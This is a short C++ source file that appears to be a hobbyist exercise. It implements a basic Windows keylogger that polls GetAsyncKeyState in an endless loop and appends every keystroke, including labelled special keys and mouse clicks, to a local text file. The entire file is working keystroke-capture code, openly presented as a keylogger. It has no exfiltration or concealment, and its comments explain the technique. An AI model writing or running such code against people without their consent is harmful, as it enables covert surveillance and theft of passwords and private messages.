// basic keylogger programming using the windows api library
// I tried using hooks to get this to work but I wasn't able to get it to work
#include <iostream>
#include <windows.h>
using namespace std;

#define filename "output.txt"

int main()
{
    remove(filename);               // removes old output
    FILE *myfile;                   // new file

    bool interrupt = false;
    while (!interrupt)
    {              // infinite loops are normally bad practice, but we want to indefinitely record keys
        myfile = fopen(filename, "a+"); // appends since we write to file char by char
        // https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
        for (char i = 1; i < 255; i++)
        { // iterates through all virtual key codes, if it is being pressed, it calls function that writes to file
            if (GetAsyncKeyState(i) == -32767)
            { // this in binary is 1000000000000000. This is done because
                if (i == VK_SHIFT)
                { // the most signifigant bit determines if the key is currently pressed or not
                    fprintf(myfile, "[SHIFT]");
                }
                else if (i == VK_BACK)
                {
                    fprintf(myfile, "[BACKSPACE]");
                }
                else if (i == VK_RETURN)
                {
                    fprintf(myfile, "[ENTER]");
                }
                else if (i == VK_CONTROL)
                {
                    fprintf(myfile, "[CTRL]");
                }
                else if (i == VK_MENU)
                {
                    fprintf(myfile, "[ALT]");
                }
                else if (i == VK_TAB)
                {
                    fprintf(myfile, "[TAB]");
                }
                else if (i == VK_LBUTTON)
                {
                    fprintf(myfile, "[M1]");
                }
                else if (i == VK_RBUTTON)
                {
                    fprintf(myfile, "[M2]");
                }
                else if (i == VK_ESCAPE)
                {
                    fprintf(myfile, "[ESC]");
                }
                else
                {
                    fprintf(myfile, "%c", i);
                }
            }
        }
        fclose(myfile);
    }
    return 0;
}